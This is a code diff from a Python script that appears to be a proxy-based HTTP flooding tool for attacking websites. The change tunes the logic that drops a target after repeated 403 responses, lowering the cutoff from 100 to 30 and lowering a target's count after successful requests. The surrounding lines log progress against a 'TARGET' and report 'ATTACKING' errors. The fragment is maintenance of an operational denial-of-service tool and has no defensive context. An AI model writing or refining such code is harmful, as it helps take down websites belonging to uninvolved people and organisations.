@@ -128,13 +128,16 @@ def mainth(protocol, ip, proxy_name, region):
                             (str(counter403[current_target]) if current_target in counter403 else '0') +
                             ") TARGET: " + current_target + " PROXY: " + proxy_name +
                             " | " + region)
-                if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 100)):
+                if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                     sites.pop(index_)
                     break
                 if response.status_code == 403:
                     if current_target not in counter403:
                         counter403[current_target] = 0
                     counter403[current_target] += 1
+                else:
+                    if current_target in counter403:
+                        counter403[current_target] -= 1
 
             except Exception as err:
                 logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
